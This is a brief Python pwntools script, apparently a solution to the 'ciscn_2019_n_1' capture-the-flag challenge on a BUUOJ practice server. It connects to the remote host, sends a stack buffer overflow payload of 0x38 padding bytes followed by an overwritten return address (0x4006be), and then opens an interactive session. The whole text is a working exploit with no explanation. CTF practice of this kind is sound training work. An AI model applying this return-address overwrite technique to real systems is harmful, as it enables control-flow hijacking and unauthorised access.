from pwn import *

#r = process('./ciscn_2019_n_1')
r = remote('node3.buuoj.cn', '27296')

p = 'a' * 0x38 + p64(0x004006be)

r.sendline(p)


r.interactive()
